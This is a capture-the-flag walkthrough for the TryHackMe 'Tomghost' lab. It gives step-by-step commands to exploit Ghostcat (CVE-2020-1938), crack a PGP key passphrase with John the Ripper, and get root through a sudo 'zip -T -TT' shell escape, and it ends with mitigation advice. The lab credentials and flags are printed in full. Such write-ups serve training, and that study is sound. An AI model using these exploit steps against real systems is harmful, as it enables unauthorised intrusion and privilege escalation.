# Tomghost CTF Walkthrough

**Target:** Tomghost  
**Source:** [TryHackMe](https://tryhackme.com/room/tomghost)  
**Difficulty:** Easy  
**Target IP:** 10.114.148.168

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Ghostcat File Read (CVE-2020-1938)](#ghostcat-file-read-cve-2020-1938)
- [SSH Foothold](#ssh-foothold)
- [User Flag](#user-flag)
- [GPG Key Cracking](#gpg-key-cracking)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Tomghost is an easy Linux box centred on an Apache Tomcat installation
vulnerable to **Ghostcat (CVE-2020-1938)**. The objective is to gain a foothold
on the system and escalate to root, capturing both the user and root flags. The
attack chain covers service enumeration to discover Tomcat 9.0.30, abuse of the
AJP connector to read `WEB-INF/web.xml` which leaks SSH credentials, recovery of
a PGP private key and passphrase to decrypt a second user's credentials, and a
`sudo` misconfiguration on `zip` (a GTFOBins technique) for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Vulnerability research (CVE identification)
- AJP / Ghostcat file inclusion exploitation
- Credential discovery and SSH access
- GPG key cracking with John the Ripper
- Linux privilege escalation via `sudo` GTFOBins (`zip`)

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.114.148.168
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 53/tcp | domain | tcpwrapped |
| 8009/tcp | ajp13 | Apache Jserv (Protocol v1.3) |
| 8080/tcp | http | Apache Tomcat 9.0.30 |

A full service/script scan confirms the versions:

```bash
nmap -sV -sC -p- 10.114.148.168
```

```
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
```

Four ports are open. The standout pair is **8080 (Tomcat 9.0.30)** and
**8009 (AJP13)** — the exact combination that signals the Ghostcat vulnerability.

---

## Web Enumeration

### Directory Brute Force

Gobuster is run against the Tomcat web server to map the application:

```bash
gobuster dir -u http://10.114.148.168:8080/ -w /usr/share/wordlists/dirb/big.txt
```

```
docs                 (Status: 302) [--> /docs/]
examples             (Status: 302) [--> /examples/]
favicon.ico          (Status: 200) [Size: 21630]
manager              (Status: 302) [--> /manager/]
```

Only the default Tomcat directories are present, so the real attack surface is
the exposed **AJP connector on port 8009**, not the web app itself.

> **Application:** Apache Tomcat 9.0.30 with AJP13 exposed on 8009

---

## Ghostcat File Read (CVE-2020-1938)

A quick search on the Tomcat version points to the Ghostcat vulnerability:

> **CVE-2020-1938 (Ghostcat):** An AJP Request Injection / Local File Inclusion
> vulnerability that lets an attacker read or include arbitrary files within the
> webapp or configuration directories via the AJP connector.

The public exploit is located with `searchsploit`:

```bash
searchsploit ghostcat
```

```
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion              | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit) | multiple/webapps/49039.rb
```

```bash
locate 48143.py
cp /usr/share/exploitdb/exploits/multiple/webapps/48143.py .
```

The exploit defaults to reading `WEB-INF/web.xml`. Running it under **Python 2.7**
(the script uses the legacy `socket.makefile(bufsize=...)` argument and fails on
Python 3):

```bash
python2.7 48143.py 10.114.148.168
```

The leaked `web.xml` contains hardcoded SSH credentials in its description block:

```xml
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

> **Recovered credentials:** `skyfuck : 8730281lkjlkjdqlksalks`

---

## SSH Foothold

The leaked credentials authenticate over SSH:

```bash
ssh skyfuck@10.114.148.168
```

```
skyfuck@ubuntu:~$ whoami
skyfuck
```

> **Foothold:** `skyfuck`

---

## User Flag

The user flag lives in the `merlin` home directory, which `skyfuck` can read:

```bash
skyfuck@ubuntu:/home$ ls
merlin  skyfuck
skyfuck@ubuntu:/home$ cd merlin
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

> **User flag:** `THM{GhostCat_1s_so_cr4sy}`

`skyfuck` has no sudo rights, so a path to `merlin` is needed:

```bash
skyfuck@ubuntu:~$ sudo -l
Sorry, user skyfuck may not run sudo on ubuntu.
```

---

## GPG Key Cracking

The `skyfuck` home directory holds an encrypted credential file and a PGP private
key:

```bash
skyfuck@ubuntu:~$ ls -l
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
```

Both files are copied back to the attacker machine:

```bash
scp skyfuck@10.114.148.168:~/credential.pgp .
scp skyfuck@10.114.148.168:~/tryhackme.asc .
```

The private key is converted to a John-crackable hash and brute-forced against
`rockyou.txt`:

```bash
gpg2john tryhackme.asc > key
john --wordlist=/usr/share/wordlists/rockyou.txt key
```

```
alexandru        (tryhackme)
1g 0:00:00:00 DONE
```

> **GPG passphrase:** `alexandru`

The key is imported and the credential file decrypted using the cracked
passphrase:

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

> **Recovered credentials:** `merlin : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

---

## Privilege Escalation

Logging in as `merlin` and checking sudo rights reveals a passwordless `zip`
entry:

```bash
ssh merlin@10.114.148.168
merlin@ubuntu:~$ sudo -l
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

`zip` can spawn a command via its `-T -TT` test options ([GTFOBins](https://gtfobins.github.io/gtfobins/zip/)).
Running it under `sudo` yields a root shell:

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT '/bin/sh #'
# whoami
root
```

The root flag is then read directly:

```bash
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{Z1P_1S_FAKE}
```

> **Root flag:** `THM{Z1P_1S_FAKE}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{GhostCat_1s_so_cr4sy}` | `/home/merlin/user.txt` |
| Root flag | `THM{Z1P_1S_FAKE}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Ghostcat — AJP File Read/Inclusion, CVE-2020-1938 (Critical)

**Description:** Apache Tomcat 9.0.30 exposed its AJP connector on port 8009.
The Ghostcat vulnerability allowed an unauthenticated attacker to read arbitrary
files under the webapp directory, including `WEB-INF/web.xml`.

**Impact:** Disclosure of hardcoded SSH credentials stored in `web.xml`, giving
an attacker an initial foothold on the system.

**Mitigation:**
- Upgrade Tomcat to a patched version (9.0.31+ / 8.5.51+ / 7.0.100+).
- Disable the AJP connector if unused, or bind it to localhost and enable a
  `secret` / `requiredSecret` attribute.
- Never store credentials inside application configuration files.

### 2. Hardcoded Credentials in Configuration (High)

**Description:** Plaintext SSH credentials (`skyfuck:8730281lkjlkjdqlksalks`)
were embedded in the Tomcat `web.xml` description block.

**Impact:** Direct SSH access as a low-privileged user once `web.xml` was read.

**Mitigation:**
- Remove credentials from source and configuration files.
- Use a secrets manager or environment-based injection for sensitive values.

### 3. Weak GPG Key Passphrase (High)

**Description:** A PGP private key (`tryhackme.asc`) and an encrypted credential
file were left world-readable in a user home directory. The key passphrase
(`alexandru`) was a dictionary word cracked instantly with John the Ripper.

**Impact:** Decryption of `credential.pgp` revealed the `merlin` user's password,
enabling lateral movement.

**Mitigation:**
- Protect private keys with strong, high-entropy passphrases.
- Do not leave private keys or encrypted secrets in readable locations.

### 4. Sudo Misconfiguration — `zip` GTFOBins (Critical)

**Description:** `merlin` could run `/usr/bin/zip` as root with `NOPASSWD`.
The `zip` binary's `-T -TT` test-command options allow arbitrary command
execution, escalating to a full root shell.

**Impact:** Full privilege escalation from `merlin` to `root`.

**Mitigation:**
- Apply least privilege in `sudoers`; never grant `sudo` on binaries with
  documented command-execution side effects (see GTFOBins).
- Audit `sudo` rules against the GTFOBins project regularly.

---

## Attack Chain Summary

```
Nmap scan → 4 open ports (SSH, DNS, AJP, Tomcat 9.0.30)
    ↓
Tomcat 9.0.30 + AJP 8009 → Ghostcat (CVE-2020-1938)
    ↓
48143.py (python2.7) → read WEB-INF/web.xml
    ↓
Leaked creds: skyfuck : 8730281lkjlkjdqlksalks
    ↓
SSH foothold as skyfuck
    ↓
User flag: THM{GhostCat_1s_so_cr4sy} (/home/merlin/user.txt)
    ↓
scp credential.pgp + tryhackme.asc → gpg2john → john → passphrase: alexandru
    ↓
gpg --decrypt credential.pgp → merlin : asuyusdoiuq...
    ↓
SSH as merlin → sudo -l → (root) NOPASSWD: /usr/bin/zip
    ↓
sudo zip $TF /etc/hosts -T -TT '/bin/sh #' → root shell
    ↓
Root flag: THM{Z1P_1S_FAKE} (/root/root.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster | Web directory enumeration |
| searchsploit / 48143.py | Ghostcat AJP file read exploit |
| ssh / scp | Remote access and file transfer |
| gpg2john | Convert PGP private key to John hash |
| John the Ripper | GPG passphrase cracking |
| gpg | Key import and credential decryption |
| zip / sudo | Privilege escalation (GTFOBins) |

---

## References

- [TryHackMe — Tomghost](https://tryhackme.com/room/tomghost)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [CVE-2020-1938 (Ghostcat)](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [Exploit-DB 48143](https://www.exploit-db.com/exploits/48143)
- [GTFOBins — zip](https://gtfobins.github.io/gtfobins/zip/)
- [John the Ripper](https://www.openwall.com/john/)

---
